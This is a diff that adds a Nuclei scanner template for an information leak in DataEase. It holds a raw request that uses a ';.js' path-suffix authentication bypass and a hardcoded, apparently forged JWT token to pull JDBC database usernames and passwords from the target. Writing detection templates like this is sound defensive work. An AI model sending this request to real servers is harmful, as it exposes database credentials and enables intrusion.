@@ -1,0 +1,24 @@
+id: dataease-infoleak
+
+info:
+  name: dataease-infoleak
+  author: dataease
+  severity: medium
+  tags: dataease
+
+http:
+  - raw:
+      - |
+        GET /de2api/engine/getEngine;.js HTTP/1.1
+        Host: {{Hostname}}
+        X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jdbc"
+          - "username"
+          - "password"
+        condition: and
